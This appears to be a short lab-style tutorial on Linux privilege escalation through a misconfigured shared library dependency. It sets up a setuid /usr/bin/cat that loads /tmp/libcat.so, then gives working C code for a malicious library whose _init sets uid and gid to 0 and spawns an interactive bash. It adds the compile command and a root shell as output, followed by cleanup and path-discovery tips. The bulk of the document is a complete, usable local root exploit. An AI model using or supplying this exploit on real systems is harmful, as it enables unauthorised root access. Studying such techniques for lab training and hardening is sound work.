# Exploiting Shared Library Misconfigurations

## Misconfiguration

### Add Shared Library
```bash
patchelf --add-needed /tmp/libcat.so /usr/bin/cat
chmod +s /usr/bin/cat
```

## Exploiting

### Checking Linked Libraries
```bash
debian@debian:~$ ldd $(which cat)
    linux-vdso.so.1 (0x00007ffd72b77000)
    /tmp/libcat.so => not found
    libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f9ded410000)
    /lib64/ld-linux-x86-64.so.2 (0x00007f9ded605000)
```

### Verifying Dependencies
```bash
debian@debian:~$ readelf -d $(which cat)

    0x0000000000000001 (NEEDED)             Shared library: [/tmp/libcat.so]
    0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
```

### Creating Exploit Library

```c
debian@debian:/tmp$ vim exploit.c

#include <stdlib.h>
#include <unistd.h>

void _init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -i");
}
```

### Compiling the Exploit
```bash
debian@debian:/tmp$ gcc -shared -fPIC -nostartfiles -o /tmp/libcat.so exploit.c
```

### Gaining Root Access
```bash
debian@debian:/tmp$ cat test.txt 
root@debian:/tmp# id
    uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),110(bluetooth),1000(debian)
```

## Remove Shared Library
```bash
patchelf --remove-needed /tmp/libcat.so /usr/bin/cat
```

## Find Shared Library Location

```bash
$ ldd $(which cat)
    /tmp/libcat.so => not found
```

```bash
$ readelf -d $(which cat)
    0x0000000000000001 (NEEDED)             Shared library: [/tmp/libcat.so]
    0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
```

If the above commands do not reveal the shared library location, the location might be hidden. In such cases, configuration files may provide hints.

### Checking Configuration Files for Library Path

```bash
$ ls -lha /etc/ld.so.conf.d/
-rw-r--r--  1 root root   44 Apr 10  2024 library.txt
```

```bash
$ cat /etc/ld.so.conf.d/library.txt
/tmp
```

This indicates that the shared library should be placed in the `/tmp` directory.
